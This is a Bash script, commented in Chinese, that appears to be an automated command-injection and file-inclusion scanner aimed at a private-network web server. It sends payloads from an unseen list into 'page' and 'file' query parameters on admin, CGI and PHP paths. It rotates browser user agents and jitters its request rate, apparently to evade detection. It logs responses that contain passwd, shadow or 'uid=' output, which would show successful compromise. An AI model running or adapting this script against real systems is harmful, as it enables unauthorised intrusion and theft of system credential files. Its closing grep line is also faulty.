#!/bin/bash

# 配置参数
SERVER="192.168.139.141"
PORT="443"
DURATION=300                # 测试持续时间(秒)
BASE_RATE=3                 # 基础请求速率(请求/秒)
LOG_FILE="cmd_exec_scan_$(date +%Y%m%d_%H%M%S).log"
PAYLOAD_FILE="BSD-files.txt"

# 用户代理列表
USER_AGENTS=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
  "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
  "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
  "curl/7.68.0"
)

# 路径列表
PATHS=("/" "/cgi-bin/test" "/admin" "/search" "/api/v1" "/index.php" "/index.php" "/view.php" "/download.php" "/show.php")

# 检查载荷文件是否存在
if [ ! -f "$PAYLOAD_FILE" ]; then
  echo "错误: 载荷文件 $PAYLOAD_FILE 不存在!"
  exit 1
fi

# 读取载荷文件
mapfile -t PAYLOADS < "$PAYLOAD_FILE"

# 初始化日志文件
echo "命令执行测试报告 - $(date)" > $LOG_FILE
echo "目标: $SERVER" >> $LOG_FILE
echo "载荷文件: $PAYLOAD_FILE" >> $LOG_FILE
echo "开始时间: $(date +%T)" >> $LOG_FILE
echo "----------------------------------------" >> $LOG_FILE

# 主扫描函数
start_scan() {
  local start_time=$(date +%s)
  local end_time=$((start_time + DURATION))
  local current_time=$(date +%s)
  local request_count=0
  
  while [ $current_time -lt $end_time ]; do
    # 随机选择路径和载荷
    local random_path=${PATHS[$RANDOM % ${#PATHS[@]}]}
    local random_payload=${PAYLOADS[$RANDOM % ${#PAYLOADS[@]}]}
    local user_agent=${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}
    
    # 随机请求速率(基础速率±2)
    local current_rate=$((BASE_RATE + (RANDOM % 5) - 2))
    [ $current_rate -lt 1 ] && current_rate=1
    
    # 构建测试URL
    local test_url=""
    case $((RANDOM % 3)) in
      0) # 作为路径参数
        test_url="https://$SERVER:$PORT$random_path?page=$random_payload"
        ;;
      1) # 作为查询参数
        test_url="https://$SERVER:$PORT$random_path?file=$random_payload"
        ;;
      2) # 作为片段标识
        test_url="https://$SERVER:$PORT$random_path#$random_payload"
        ;;
    esac
    
    # 发送请求
    echo "[$(date +%T)] 测试 #$((++request_count)): ${test_url:0:60}..." | tee -a $LOG_FILE
    curl -vk --http3 \
      -A "$user_agent" \
      -H "X-Request-ID: $(date +%s%N)-$RANDOM" \
      --connect-timeout 3 \
      --max-time 5 \
      "$test_url" 2>&1 | grep -E '^< HTTP|uid=|root:|passwd|shadow|command not found|syntax error' >> $LOG_FILE
    
    # 随机延迟控制速率
    sleep $(awk "BEGIN {print (1/$current_rate) + (($RANDOM%1000)/3000)}")
    
    current_time=$(date +%s)
  done
  
  echo "----------------------------------------" >> $LOG_FILE
  echo "扫描完成" >> $LOG_FILE
  echo "总请求数: $request_count" >> $LOG_FILE
  echo "平均速率: $((request_count / DURATION)) 请求/秒" >> $LOG_FILE
}

# 执行扫描
start_scan

# 结果摘要
echo -e "\n扫描结果摘要:"
grep -i "uid=|root:|passwd|shadow|command not found|syntax error" $LOG_FILE | sort | uniq -c | sort -nr
